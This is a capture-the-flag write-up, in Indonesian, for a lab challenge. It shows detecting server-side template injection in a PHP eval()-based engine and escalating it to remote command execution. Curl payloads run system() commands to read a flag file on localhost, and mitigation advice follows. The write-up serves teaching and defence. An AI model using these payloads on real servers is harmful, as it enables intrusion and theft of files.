# WRITEUP · 05 RenderBox (SPOILER)

## 1. Deteksi SSTI

Render `{{ 7*7 }}`. Hasil `49` → ekspresi dievaluasi server (bukan ditampilkan
apa adanya). Ini Server-Side Template Injection.

## 2. Dari ekspresi ke RCE

Engine ini PHP dan memakai `eval()`. Jadi ekspresi PHP apa pun jalan:

```bash
curl -s http://127.0.0.1:9005/ --data-urlencode 'template={{ system("id") }}'
# ...uid=... (www-data / kali)
```

## 3. Baca flag user

```bash
# Lite (direktori kerja = web root; flag satu tingkat di atasnya):
curl -s http://127.0.0.1:9005/ --data-urlencode 'template={{ system("cat ../user.txt") }}' | grep -o 'FLAG{[^}]*}'

# Docker:
curl -s http://127.0.0.1:8005/ --data-urlencode 'template={{ system("cat /var/www/user.txt") }}' | grep -o 'FLAG{[^}]*}'
```

Variasi payload lain yang berguna: `{{ file_get_contents("../user.txt") }}`,
`{{ shell_exec("ls -la ..") }}`, `{{ phpversion() }}`.

## 4. Pelajaran & mitigasi

- **Jangan pernah `eval()` input user.** Itu langsung RCE.
- Untuk templating, pakai engine yang membedakan data dan kode (Twig/Blade) dan
  jangan render string template yang berasal dari user (itu pun bisa SSTI kalau
  salah pakai — nonaktifkan fitur berbahaya / sandbox).
- Kalau hanya butuh substitusi sederhana, lakukan penggantian string literal,
  bukan evaluasi ekspresi.
